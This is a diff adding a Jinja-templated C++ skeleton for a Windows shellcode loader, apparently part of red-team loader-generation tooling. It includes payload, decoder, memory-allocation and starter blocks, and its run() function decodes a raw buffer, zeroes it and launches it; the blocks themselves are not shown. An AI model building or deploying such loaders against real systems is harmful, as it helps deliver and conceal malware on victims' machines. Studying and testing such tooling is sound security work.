@@ -1,0 +1,36 @@
+{% from "blocks/macros.jinja" import function_typedef, function_definition, createThreadStub with context %}
+
+#include <windows.h>
+#include <processenv.h>
+#include <iostream>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <tlhelp32.h>
+
+{% set section="globals" %}
+{% include "blocks/common_definitions.jinja" %}
+{% include "blocks/decoders.jinja" %}
+{% include "blocks/alloc.jinja" %}
+{% include "blocks/starter.jinja" %}
+{% include "blocks/payload.jinja" %}
+
+DWORD WINAPI run(){
+    {% set section="text" %}
+    {% include "blocks/payload.jinja" %}
+
+    size_t length = sizeof(raw);
+
+    {% include "blocks/decoders.jinja" %}
+    {% include "blocks/alloc.jinja" %}
+
+    memset(raw, 0, length);
+
+    {% include "blocks/starter.jinja" %}
+    return 0;
+}
+
+int main()
+{
+    run();
+}
